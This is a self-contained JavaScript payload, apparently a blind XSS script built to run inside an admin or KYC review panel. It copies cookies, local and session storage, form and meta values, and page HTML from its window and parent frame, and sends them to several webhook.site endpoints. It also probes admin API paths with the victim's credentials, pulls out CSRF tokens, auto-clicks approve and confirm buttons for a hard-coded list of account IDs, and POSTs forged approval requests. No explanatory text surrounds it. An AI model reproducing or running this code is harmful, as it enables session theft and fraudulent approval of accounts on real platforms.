(function(){
if(window.__bb_loaded)return;try{window.__bb_loaded=1}catch(e){}
var TOK=["592d340e-18ca-4c63-aa74-70ddc8ae6bae","6f6f8980-f735-46ce-bba1-4e57fb8fdfca","b26321c6-4433-4576-8fbf-9547edf94a69","89a5cad0-b7f5-4f88-9a46-fefe0dec170e","52e47211-6837-4231-9b98-a10437cd3548","452d9f90-bdcf-49c2-b32e-491a9e630a8b","567456d8-8219-46c2-8040-de2694193da6","0f975925-933e-418a-999e-893533249a18"];
var TAG="i202", N=0, DONE=false, CLICKED={};
var ACCTS=["LXPM80780","RYPM76950","CBTD73640","YPER85516","LWJQ13287","DTCP02196","GXFF56573","BMKC34264","SNKS00313","KFHT00459","WTTH71632","STAP63549","CFQG81521","FFQC59010","FQGW45132","MSDJ23393","KJYF44734","RLLX29672","JMRC49563","YNHD32555","MFPA85039","HTAN28788","TBYB04424","WCTK08544","DESA45541","RJGY08853","QBPK70503","DJHF11979","GJFS37590","NKFE91988","AHLR08326","AMCW98609","STTG97524"];
var MARK=["bb-c2-i195","西新宿2-1-1","i194t","i195t","collector_v","iframe srcdoc"];
function T(f){try{return f()}catch(e){return "ERR:"+e}}
function sink(tok,body){
 try{navigator.sendBeacon("https://webhook.site/"+tok,body)}catch(e){}
 try{fetch("https://webhook.site/"+tok,{method:"POST",mode:"no-cors",keepalive:true,body:body})}catch(e){}
}
function S(o,crit){
 o.tag=TAG;o.ts=Date.now();
 try{o.href=T(function(){return location.href});o.origin=T(function(){return location.origin})}catch(e){}
 var b=JSON.stringify(o);
 var t1=TOK[(N++)%TOK.length];sink(t1,b);
 if(crit){var t2=TOK[(N+3)%TOK.length];sink(t2,b)}
}
function stores(w,o){
 o.ck=T(function(){return w.document.cookie});
 o.ls={};o.ss={};
 try{for(var i=0;i<w.localStorage.length;i++){var k=w.localStorage.key(i);o.ls[k]=String(w.localStorage.getItem(k)).slice(0,4000)}}catch(e){o.lse=""+e}
 try{for(var j=0;j<w.sessionStorage.length;j++){var k2=w.sessionStorage.key(j);o.ss[k2]=String(w.sessionStorage.getItem(k2)).slice(0,4000)}}catch(e){o.sse=""+e}
}
function dumpDoc(w,label){
 var o={phase:"dump",w:label,url:T(function(){return w.location.href}),origin:T(function(){return w.location.origin}),ref:T(function(){return w.document.referrer}),title:T(function(){return w.document.title})};
 stores(w,o);
 o.forms=T(function(){return [].map.call(w.document.querySelectorAll("input,meta"),function(n){return n.tagName+"|"+(n.name||n.getAttribute&&n.getAttribute("name")||n.getAttribute&&n.getAttribute("property")||"")+"|"+(n.type||"")+"|"+String(n.value||n.content||"").slice(0,120)}).slice(0,200)});
 o.links=T(function(){return [].map.call(w.document.querySelectorAll("a"),function(a){return a.href+"|"+String(a.textContent||"").trim().slice(0,60)}).slice(0,300)});
 o.scripts=T(function(){return [].map.call(w.document.querySelectorAll("script[src]"),function(s){return s.src}).slice(0,100)});
 o.html=T(function(){return w.document.documentElement.outerHTML.slice(0,200000)});
 S(o,label=="parent");return o;
}
function htmlOf(w){try{return w.document.documentElement.innerHTML}catch(e){return ""}}
function hasOurs(w){var h=htmlOf(w).toUpperCase();for(var i=0;i<ACCTS.length;i++){if(h.indexOf(ACCTS[i])>=0)return ACCTS[i]}var raw=htmlOf(w);for(var j=0;j<MARK.length;j++){if(raw.indexOf(MARK[j])>=0)return MARK[j]}return false}
function btnScore(el){
 var t=(String(el.textContent||"")+" "+(el.getAttribute?el.getAttribute("aria-label")||"":"")+" "+(el.value||"")).toLowerCase();
 if(/承認|審査通過|通過|kyc.*ok|approve|accept|confirm|confirmed|確定|実行|はい/.test(t))return 10;
 if(/審査|review|detail|詳細|確認/.test(t))return 5;
 return 0;
}
function clickEl(el){try{el.scrollIntoView&&el.scrollIntoView();el.click();return true}catch(e){return false}}
function findActionable(w){
 try{
  var all=w.document.querySelectorAll("button,a,input[type=submit],[role=button],.btn,.button");
  var out=[];
  for(var i=0;i<all.length && out.length<40;i++){var s=btnScore(all[i]);if(s>0)out.push({el:all[i],score:s,text:String(all[i].textContent||all[i].value||"").trim().slice(0,80),href:all[i].href||""})}
  return out;
 }catch(e){return []}
}
function clickBest(w){
 var acts=findActionable(w);var best=null;
 for(var i=0;i<acts.length;i++){if(acts[i].href&&/^javascript/i.test(acts[i].href))continue;if(!best||acts[i].score>best.score)best=acts[i]}
 if(!best)return null;
 var key=T(function(){return w.location.href})+"|"+best.text;
 if(CLICKED[key])return {skipped:key};
 CLICKED[key]=1;
 clickEl(best.el);
 S({phase:"click",text:best.text,href:best.href,url:T(function(){return w.location.href})},true);
 setTimeout(function(){confirmModal(w)},900);
 return {clicked:best.text};
}
function confirmModal(w){
 try{
  var all=w.document.querySelectorAll("button,a,[role=button],input[type=submit]");
  for(var i=0;i<all.length;i++){
   var el=all[i];var t=(String(el.textContent||"")+" "+(el.value||"")).toLowerCase();
   if(/承認|ok|はい|yes|実行|確定/.test(t)&&el.offsetParent!==null){
    var key=T(function(){return w.location.href})+"|confirm|"+String(el.textContent||el.value).trim().slice(0,30);
    if(CLICKED[key])continue;CLICKED[key]=1;
    clickEl(el);S({phase:"confirm",text:String(el.textContent||el.value||"").trim().slice(0,60)},true);return true;
   }
  }
 }catch(e){}
 return false;
}
function navToOurs(w){
 try{
  var links=w.document.querySelectorAll("a[href]");
  for(var i=0;i<links.length;i++){
   var a=links[i];var t=(a.href+" "+String(a.textContent||"")).toUpperCase();
   for(var j=0;j<ACCTS.length;j++){
    if(t.indexOf(ACCTS[j])>=0){
     var key="nav|"+a.href;if(CLICKED[key])return null;CLICKED[key]=1;
     S({phase:"nav",to:a.href,text:String(a.textContent||"").trim().slice(0,60)},true);
     setTimeout(function(){try{location.href=a.href}catch(e){}},300);
     return a.href;
    }
   }
  }
 }catch(e){}
 return null;
}
var PATHS=["/api/v1/admin/me","/api/v1/admin/reviewable","/api/v1/admin/kyc","/api/v1/admin/kyc/reviewable","/api/v1/admin/users","/api/v1/admin/withdrawals","/api/v1/reviewable","/api/v1/kyc/reviewable","/api/v1/kyc","/api/v1/users","/api/me","/api/reviewable","/reviewable","/api/v1/session"];
function probe(base,label){
 PATHS.forEach(function(p){
  try{fetch(base+p,{credentials:"include",cache:"no-store"}).then(function(r){
   return r.text().then(function(t){S({phase:"probe",src:label,path:p,status:r.status,ct:r.headers.get("content-type"),body:t.slice(0,120000)},false)})
  }).catch(function(e){})}catch(e){}
 });
}
function csrf(w){
 var v="";
 try{
  var m=w.document.querySelector('meta[name=csrf-token],meta[name=_csrf],meta[name=csrf]');if(m)v=m.getAttribute("content")||"";
  if(!v){var c=w.document.cookie.match(/(?:XSRF-TOKEN|csrf_token|csrftoken)=([^;]+)/);if(c)v=decodeURIComponent(c[1])}
 }catch(e){}
 return v;
}
function tryApproveApi(w,id){
 var base=T(function(){return w.location.origin})||"";
 var tk=csrf(w);
 var cands=["/api/v1/admin/kyc/"+id+"/approve","/api/v1/admin/kyc/approve","/api/v1/admin/kyc/"+id+"/status","/api/v1/admin/review/"+id+"/approve","/api/v1/admin/reviewable/"+id+"/approve"];
 cands.forEach(function(p){
  try{fetch(base+p,{method:"POST",credentials:"include",cache:"no-store",headers:{"Content-Type":"application/json","X-CSRF-Token":tk,"X-XSRF-TOKEN":tk,"X-Requested-With":"XMLHttpRequest"},body:JSON.stringify({status:"DONE",kyc_status:"DONE",approved:true,action:"approve"})}).then(function(r){
   return r.text().then(function(t){S({phase:"approve_api",path:p,id:id,status:r.status,body:t.slice(0,4000)},true)})
  }).catch(function(e){})}catch(e){}
 });
}
function run(w,label){
 var id=hasOurs(w);
 dumpDoc(w,label);
 try{probe(T(function(){return w.location.origin})||"",label+":same-origin")}catch(e){}
 if(!id){S({phase:"no_ours",w:label},false);return}
 S({phase:"ours_found",w:label,id:id,title:T(function(){return w.document.title})},true);
 var r=clickBest(w);S({phase:"click_result",w:label,r:r},true);
 if(r&&r.clicked){setTimeout(function(){tryApproveApi(w,id);navToOurs(w)},1600);}
 else{navToOurs(w)}
 setTimeout(function(){tryApproveApi(w,id);confirmModal(w);S({phase:"rescan",w:label,acts:findActionable(w).map(function(x){return x.text})},false)},4000);
}
run(window,"self");
try{if(parent&&parent!==window)run(parent,"parent")}catch(e){}
setTimeout(function(){try{S({phase:"alive",u:location.href,p:T(function(){return parent.location.href})},false)}catch(e){}},25000);
setTimeout(function(){try{if(!DONE){DONE=true;run(window,"self2");try{if(parent&&parent!==window)run(parent,"parent2")}catch(e){}}}catch(e){}},45000);
})();
